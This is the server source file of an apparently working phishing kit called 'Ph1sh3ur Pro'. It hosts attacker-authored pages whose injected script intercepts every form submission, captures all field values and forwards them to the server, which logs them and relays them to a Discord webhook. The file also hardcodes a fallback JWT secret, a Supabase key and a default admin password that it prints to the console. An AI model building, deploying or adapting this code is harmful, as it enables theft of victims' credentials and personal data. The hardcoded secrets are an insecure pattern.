import "dotenv/config";
import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import cookieParser from "cookie-parser";
import { createClient } from "@supabase/supabase-js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const JWT_SECRET = process.env.JWT_SECRET || "ph1sh3ur-secret-key-2026";
const SUPABASE_URL = process.env.SUPABASE_URL || "https://oxyrlpiknlsytygrdydh.supabase.co";
const SUPABASE_KEY = process.env.SUPABASE_KEY || "sb_publishable_MN_NO7gG2KqvSDrQlG9zog_2e2CK2ZT";

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

async function startServer() {
  const app = express();
  const PORT = Number(process.env.PORT) || 3000;

  // Initialize Admin User if not exists
  try {
    const { data: adminUser } = await supabase.from('users').select('*').eq('username', 'admin').single();
    if (!adminUser) {
      const hashedPassword = bcrypt.hashSync("Ph1sh3ur-Pro-2026", 10);
      await supabase.from('users').insert([{ username: 'admin', password: hashedPassword, role: 'admin' }]);
      console.log("Default admin user created in Supabase: admin / Ph1sh3ur-Pro-2026");
    }
  } catch (err) {
    console.error("Failed to initialize admin user:", err);
  }

  app.use(express.json());
  app.use(cookieParser());

  // Auth Middleware
  const authenticate = (req: any, res: any, next: any) => {
    const token = req.cookies.token;
    if (!token) return res.status(401).json({ error: "Unauthorized" });
    try {
      const decoded = jwt.verify(token, JWT_SECRET);
      req.user = decoded;
      next();
    } catch (err) {
      res.status(401).json({ error: "Invalid token" });
    }
  };

  // Auth Routes
  app.post("/api/login", async (req, res) => {
    const { username, password } = req.body;
    const { data: user } = await supabase.from('users').select('*').eq('username', username).single();
    if (!user || !bcrypt.compareSync(password, user.password)) {
      return res.status(401).json({ error: "Invalid credentials" });
    }
    const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, JWT_SECRET, { expiresIn: "24h" });
    res.cookie("token", token, { httpOnly: true, secure: true, sameSite: 'none', maxAge: 24 * 60 * 60 * 1000 });
    res.json({ id: user.id, username: user.username, role: user.role });
  });

  app.post("/api/logout", (req, res) => {
    res.clearCookie("token");
    res.json({ success: true });
  });

  app.get("/api/me", (req, res) => {
    const token = req.cookies.token;
    if (!token) return res.status(401).json({ error: "Not logged in" });
    try {
      const decoded = jwt.verify(token, JWT_SECRET);
      res.json(decoded);
    } catch (err) {
      res.status(401).json({ error: "Invalid token" });
    }
  });

  // User Management
  app.get("/api/users", authenticate, async (req: any, res) => {
    if (req.user.role !== 'admin') return res.status(403).json({ error: "Forbidden" });
    const { data: users } = await supabase.from('users').select('id, username, role, created_at');
    res.json(users || []);
  });

  app.post("/api/users", authenticate, async (req: any, res) => {
    if (req.user.role !== 'admin') return res.status(403).json({ error: "Forbidden" });
    const { username, password, role } = req.body;
    const hashedPassword = bcrypt.hashSync(password, 10);
    const { error } = await supabase.from('users').insert([{ username, password: hashedPassword, role: role || 'user' }]);
    if (error) return res.status(400).json({ error: "Username already exists or error" });
    res.json({ success: true });
  });

  app.delete("/api/users/:id", authenticate, async (req: any, res) => {
    if (req.user.role !== 'admin') return res.status(403).json({ error: "Forbidden" });
    if (parseInt(req.params.id) === req.user.id) return res.status(400).json({ error: "Cannot delete yourself" });
    await supabase.from('users').delete().eq('id', req.params.id);
    res.json({ success: true });
  });

  // API Routes
  app.get("/api/pages", authenticate, async (req, res) => {
    const { data: pages } = await supabase.from('pages').select('*').order('created_at', { ascending: false });
    res.json(pages || []);
  });

  app.post("/api/pages", authenticate, async (req, res) => {
    const { id, title, button_text, content, webhook_enabled } = req.body;
    const { error } = await supabase.from('pages').upsert({ 
      id, title, button_text, content, 
      webhook_enabled: webhook_enabled ? true : false,
      updated_at: new Date().toISOString()
    });
    if (error) return res.status(400).json({ error: error.message });
    res.json({ success: true });
  });

  app.delete("/api/pages/:id", authenticate, async (req, res) => {
    await supabase.from('pages').delete().eq('id', req.params.id);
    res.json({ success: true });
  });

  app.get("/api/logs", authenticate, async (req, res) => {
    const { data: logs } = await supabase.from('logs').select('*').order('timestamp', { ascending: false }).limit(100);
    res.json(logs || []);
  });

  app.delete("/api/logs", authenticate, async (req, res) => {
    await supabase.from('logs').delete().neq('id', 0); // Delete all
    res.json({ success: true });
  });

  app.delete("/api/logs/:id", authenticate, async (req, res) => {
    await supabase.from('logs').delete().eq('id', req.params.id);
    res.json({ success: true });
  });

  app.post("/api/webhook/:pageId", async (req, res) => {
    const { pageId } = req.params;
    const data = JSON.stringify(req.body);
    console.log(`Webhook received for page ${pageId}:`, req.body);
    
    // Check if webhook is enabled for this page
    const { data: page } = await supabase.from('pages').select('webhook_enabled').eq('id', pageId).single();
    if (!page || !page.webhook_enabled) {
      console.log(`Webhook disabled for page ${pageId}`);
      return res.json({ success: false, message: "Webhook disabled for this page" });
    }

    // Bot detection (Honeypot)
    if (req.body._hp_field) {
      console.log("Bot detected via honeypot field");
      return res.json({ success: true, bot: true });
    }

    // Log the event
    await supabase.from('logs').insert([{ page_id: pageId, event_type: "interaction", data }]);

    // Forward to Discord if configured
    const { data: discordWebhook } = await supabase.from('settings').select('value').eq('key', 'discord_webhook').single();
    console.log("Discord webhook setting:", discordWebhook?.value);
    if (discordWebhook?.value) {
      try {
        const eventType = req.body._event_type || 'interaction';
        const cleanData = { ...req.body };
        delete cleanData._event_type;
        delete cleanData._timestamp;
        delete cleanData._url;

        const response = await fetch(discordWebhook.value, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [{
              title: `🚀 Ph1sh3ur Alert: ${eventType === 'form_submission' ? 'Form Submitted' : 'Button Clicked'}`,
              description: `New activity on page: **${pageId}**`,
              color: eventType === 'form_submission' ? 0x10b981 : 0x3b82f6,
              fields: [
                {
                  name: "Data Received",
                  value: `\`\`\`json\n${JSON.stringify(cleanData, null, 2).substring(0, 1000)}\n\`\`\``
                },
                {
                  name: "Source URL",
                  value: req.body._url || 'Unknown'
                }
              ],
              timestamp: new Date().toISOString()
            }]
          })
        });
        console.log("Discord webhook response status:", response.status);
        if (!response.ok) {
            const errorText = await response.text();
            console.error("Discord webhook error response:", errorText);
        }
      } catch (err) {
        console.error("Discord webhook failed", err);
      }
    }

    res.json({ success: true });
  });

  app.post("/api/webhook/test", authenticate, async (req, res) => {
    const { data: discordWebhook } = await supabase.from('settings').select('value').eq('key', 'discord_webhook').single();
    if (discordWebhook?.value) {
      try {
        await fetch(discordWebhook.value, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `✅ **Ph1sh3ur Test**: Your Discord webhook is properly configured!`,
            embeds: [{
              title: "Ph1sh3ur System Check",
              description: "This is a test notification to confirm your integration is working.",
              color: 0x10b981,
              timestamp: new Date().toISOString()
            }]
          })
        });
        return res.json({ success: true });
      } catch (err) {
        return res.status(500).json({ success: false, error: "Failed to send to Discord" });
      }
    }
    res.status(400).json({ success: false, error: "No webhook configured" });
  });

  app.get("/api/settings", authenticate, async (req, res) => {
    const { data: settings } = await supabase.from('settings').select('*');
    const settingsObj = (settings || []).reduce((acc: any, curr: any) => {
      acc[curr.key] = curr.value;
      return acc;
    }, {});
    res.json(settingsObj);
  });

  app.get("/preview/:id", async (req, res) => {
    const { data: page } = await supabase.from('pages').select('*').eq('id', req.params.id).single();
    if (!page) return res.status(404).send("Page not found");

    const { data: settings } = await supabase.from('settings').select('*');
    const settingsObj = (settings || []).reduce((acc: any, curr: any) => {
      acc[curr.key] = curr.value;
      return acc;
    }, {});

    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>${page.title}</title>
        <style>
          body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
          #action-button { cursor: pointer; }
          .hp-field { display: none !important; visibility: hidden !important; }
        </style>
      </head>
      <body>
        ${page.content}
        <script>
          // Form Detection & Webhook Integration
          document.addEventListener('DOMContentLoaded', () => {
            const pageId = "${page.id}";
            console.log("Ph1sh3ur Tracker initialized for page:", pageId);
            
            // 1. Add Honeypot and intercept all forms
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
              if (!form.querySelector('input[name="_hp_field"]')) {
                const hp = document.createElement('input');
                hp.type = 'text';
                hp.name = '_hp_field';
                hp.style.display = 'none';
                hp.tabIndex = -1;
                hp.autocomplete = 'off';
                form.appendChild(hp);
              }

              form.addEventListener('submit', async (e) => {
                e.preventDefault();
                
                // Robust data capture
                const data = {};
                const inputs = form.querySelectorAll('input, textarea, select');
                inputs.forEach(input => {
                  if (input.name === '_hp_field') return;
                  
                  const key = input.name || input.id || input.placeholder || 'unnamed_field_' + Math.random().toString(36).substr(2, 5);
                  
                  if (input.type === 'checkbox') {
                    data[key] = input.checked;
                  } else if (input.type === 'radio') {
                    if (input.checked) data[key] = input.value;
                  } else {
                    data[key] = input.value;
                  }
                });
                
                console.log("Form submission detected:", data);
                await sendToWebhook(data, 'form_submission');
                
                const submitBtn = form.querySelector('button[type="submit"]') || form.querySelector('input[type="submit"]');
                const originalText = submitBtn ? (submitBtn.innerText || submitBtn.value) : null;
                if (submitBtn) {
                  submitBtn.innerText = "Sent!";
                  if (submitBtn.value) submitBtn.value = "Sent!";
                  setTimeout(() => {
                    if (originalText) {
                      submitBtn.innerText = originalText;
                      submitBtn.value = originalText;
                    }
                  }, 2000);
                }
              });
            });

            // 2. Track all button clicks
            document.addEventListener('click', async (e) => {
              const target = e.target.closest('button, a.btn, .button, #action-button');
              if (!target) return;
              
              // If it's a submit button inside a form, the form listener handles it
              if (target.type === 'submit' && target.closest('form')) return;

              console.log("Button/Link click detected:", target.innerText);
              await sendToWebhook({
                text: target.innerText || target.value,
                id: target.id,
                className: target.className,
                href: target.href || null,
                userAgent: navigator.userAgent
              }, 'click');
            });

            async function sendToWebhook(payload, type) {
              try {
                const response = await fetch('/api/webhook/' + pageId, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    ...payload,
                    _event_type: type,
                    _timestamp: new Date().toISOString(),
                    _url: window.location.href
                  })
                });
                if (response.ok) {
                  console.log("Ph1sh3ur: Data sent successfully");
                }
              } catch (err) {
                console.error('Ph1sh3ur: Webhook failed', err);
              }
            }
          });
        </script>
      </body>
      </html>
    `;
    res.send(html);
  });

  app.post("/api/settings", authenticate, async (req, res) => {
    const { discord_webhook, logo_url } = req.body;
    if (discord_webhook !== undefined) {
      await supabase.from('settings').upsert({ key: "discord_webhook", value: discord_webhook });
    }
    if (logo_url !== undefined) {
      await supabase.from('settings').upsert({ key: "logo_url", value: logo_url });
    }
    res.json({ success: true });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "custom",
    });
    app.use(vite.middlewares);
    
    app.get("/*", async (req, res, next) => {
      const url = req.url.split('?')[0];
      if (url.startsWith('/api') || url.startsWith('/preview')) {
        return res.status(404).json({ error: "API route not found" });
      }
      try {
        const html = await vite.transformIndexHtml(req.url, `
          <!doctype html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Ph1sh3ur Pro</title>
            </head>
            <body>
              <div id="root"></div>
              <script type="module" src="/src/main.tsx"></script>
            </body>
          </html>
        `);
        res.status(200).set({ 'Content-Type': 'text/html' }).end(html);
      } catch (e) {
        vite.ssrFixStacktrace(e as Error);
        next(e);
      }
    });
  } else {
    // In production, server.js is in dist/server.js, so __dirname is dist/
    app.use(express.static(path.join(__dirname, "client")));
    app.get("/*", (req, res) => {
      const url = req.url.split('?')[0];
      if (url.startsWith('/api') || url.startsWith('/preview')) {
        return res.status(404).json({ error: "API route not found" });
      }
      res.sendFile(path.join(__dirname, "client", "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
